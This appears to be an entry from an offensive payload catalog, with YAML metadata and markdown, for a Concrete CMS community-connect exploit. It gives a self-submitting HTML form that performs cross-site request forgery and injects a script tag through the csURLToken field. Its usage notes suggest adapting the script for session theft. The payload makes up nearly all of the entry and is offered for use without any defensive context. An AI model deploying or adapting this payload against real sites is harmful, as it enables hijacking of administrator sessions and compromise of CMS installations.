---
data: >-
  <html>

  <body>

  <form method="POST"
  action="http://[host]/concrete5/index.php/dashboard/extend/connect/connect_complete">

  <input type="hidden" name="csToken" value="my_token">

  <input type="hidden" name="csURLToken"
  value="</a><script>alert(/XSS/)</script>">

  </form>

  <script>document.forms[0].submit()</script>

  </body>

  </html>
tags:
  - xss
  - exploit
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.388Z'
id: fb9db593-fdbd-4912-8ae8-e2701f1adcf8
verified: false
validated: true
submitted: true
---
# complete-community-connect-with-xss-in-csurltoken

## Command

```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/dashboard/extend/connect/connect_complete">
<input type="hidden" name="csToken" value="my_token">
<input type="hidden" name="csURLToken" value="</a><script>alert(/XSS/)</script>">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

## Description

Submits community connect form with XSS in csURLToken for Concrete CMS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| csURLToken | Payload to close anchor and inject script | Yes |
| csToken | Valid connect token | Yes |

## Examples

### Basic Usage

Use after initiating connect.

### Advanced Usage

Customize script for session theft.

## Expected Output

Connect completes; alert on dashboard.

## Related

- [[Related Procedure]]
